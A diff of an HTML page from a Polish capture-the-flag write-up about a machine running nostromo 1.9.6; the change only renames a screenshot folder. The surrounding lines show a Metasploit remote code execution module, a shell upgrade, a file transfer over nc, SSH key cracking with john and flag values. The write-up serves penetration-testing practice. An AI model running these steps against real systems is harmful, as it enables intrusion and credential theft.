@@ -256,7 +256,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 <p>Szybkie sprawdzenie <code>nostromo 1.9.6</code>, okazuje się, że jest exploit na zdalne wykonywanie kodu.</p>
 <p>Msfconsole -&gt; exploit/multi/http/nostromo_code_exec</p>
 <p><code>python -c 'import pty; pty.spawn(&quot;/bin/sh&quot;)'</code></p>
-<p><img loading="lazy" src="../../../Screenshots/Pasted%20image%2020210802124624.png" alt=""  />
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020210802124624.png" alt=""  />
 </p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">╔══════════╣ Analyzing Htpasswd Files <span style="color:#f92672">(</span>limit 70<span style="color:#f92672">)</span>                                                                                                                                                                                            
 -rw-r--r-- <span style="color:#ae81ff">1</span> root bin <span style="color:#ae81ff">41</span> Oct <span style="color:#ae81ff">25</span>  <span style="color:#ae81ff">2019</span> /var/nostromo/conf/.htpasswd                                                                                                                                                                          
@@ -302,14 +302,14 @@ htpasswd                /var/nostromo/conf/.htpasswd
 homedirs                /home
 homedirs_public         public_www
 </code></pre></div><p>Nietypowa ścieżka domowa</p>
-<p><img loading="lazy" src="../../../Screenshots/Pasted%20image%2020210802134116.png" alt=""  />
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020210802134116.png" alt=""  />
 </p>
 <p>W kodzie zródłowym nic specjalnego nie było.</p>
 <p>Jednak, gdy pogrzebiemy głębiej, znajdziemy ciekawy folder</p>
 <pre tabindex="0"><code>homedirs                /home
 
 homedirs_public         public_www
-</code></pre><p><img loading="lazy" src="../../../Screenshots/Pasted%20image%2020210802194415.png" alt=""  />
+</code></pre><p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020210802194415.png" alt=""  />
 </p>
 <hr>
 <h2 id="przesyłanie-pliku-backuptgz-za-pomocą-nc">Przesyłanie pliku backup.tgz za pomocą nc<a hidden class="anchor" aria-hidden="true" href="#przesyłanie-pliku-backuptgz-za-pomocą-nc">#</a></h2>
@@ -318,30 +318,30 @@ homedirs_public         public_www
 </code></pre></div><p>Kali</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nc -lvnp <span style="color:#ae81ff">9000</span> &gt; backup.tgz
 </code></pre></div><p>Klucz id_rsa okazał się zaszyfrowany</p>
-<p><img loading="lazy" src="../../../Screenshots/Pasted%20image%2020210802202035.png" alt=""  />
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020210802202035.png" alt=""  />
 </p>
 <hr>
 <h2 id="ssh2john">ssh2john<a hidden class="anchor" aria-hidden="true" href="#ssh2john">#</a></h2>
 <p>Potrzebny był <code>ssh2john.py</code></p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">/usr/share/john/ssh2john.py david.ssh
-</code></pre></div><p><img loading="lazy" src="../../../Screenshots/Pasted%20image%2020210802202125.png" alt=""  />
+</code></pre></div><p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020210802202125.png" alt=""  />
 </p>
 <p>Po chwili john znalazł klucz</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">john david_john.ssh --wordlist<span style="color:#f92672">=</span> /usr/share/wordlists/rockyou.txt
-</code></pre></div><p><img loading="lazy" src="../../../Screenshots/Pasted%20image%2020210802202221.png" alt=""  />
+</code></pre></div><p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020210802202221.png" alt=""  />
 </p>
 <p><code>hunter</code></p>
 <p>Należy nadać uprawnienia 600 kluczowi</p>
-<p><img loading="lazy" src="../../../Screenshots/Pasted%20image%2020210802202408.png" alt=""  />
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020210802202408.png" alt=""  />
 </p>
 <p>Udało się</p>
 <p>user.txt</p>
 <p><code>7db0b48469606a42cec20750d9782f3d</code></p>
 <hr>
 <h1 id="priv-esc">Priv Esc<a hidden class="anchor" aria-hidden="true" href="#priv-esc">#</a></h1>
-<p><img loading="lazy" src="../../../Screenshots/Pasted%20image%2020210802202817.png" alt=""  />
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020210802202817.png" alt=""  />
 </p>
-<p><img loading="lazy" src="../../../Screenshots/Pasted%20image%2020210802205354.png" alt=""  />
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020210802205354.png" alt=""  />
 </p>
 <p>root.txt</p>
 <p><code>9aa36a6d76f785dfd320a478f6e0d906</code></p>
